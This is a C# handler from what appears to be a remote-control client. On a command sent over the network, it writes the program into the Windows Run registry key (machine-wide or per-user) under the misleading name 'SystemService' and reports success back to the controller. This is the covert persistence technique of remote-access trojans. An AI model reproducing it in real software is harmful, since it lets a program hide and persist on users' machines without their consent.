using System;
using Microsoft.Win32;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Client.Handlers
{
    class RequestWriteStartupHandler : AbstractRequestHandler
    {
        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            RunTaskThread(() =>
            {
                try
                {
                    var req = reqObj as RequestWriteStartup;
                    if (req == null) return;
                    string exePath = System.Reflection.Assembly.GetEntryAssembly().Location;
                    string regPath;

                    switch (req.StartupType)
                    {
                        case eStartupType.Registry:
                            regPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
                            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, true))
                            {
                                if (key != null)
                                    key.SetValue("SystemService", exePath + " /r");
                            }
                            break;
                        case eStartupType.RunKey:
                            regPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
                            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(regPath, true))
                            {
                                if (key != null)
                                    key.SetValue("SystemService", exePath + " /r");
                            }
                            break;
                    }

                    var resp = new ResponseWriteStartup();
                    resp.Result = true;
                    resp.Message = "启动项写入成功";
                    session.Send(ePacketType.PACKET_WRITE_STARTUP_RESPONSE, resp);
                }
                catch (Exception ex)
                {
                    var resp = new ResponseWriteStartup();
                    resp.Result = false;
                    resp.Message = ex.Message;
                    session.Send(ePacketType.PACKET_WRITE_STARTUP_RESPONSE, resp);
                }
            });
        }
    }
}
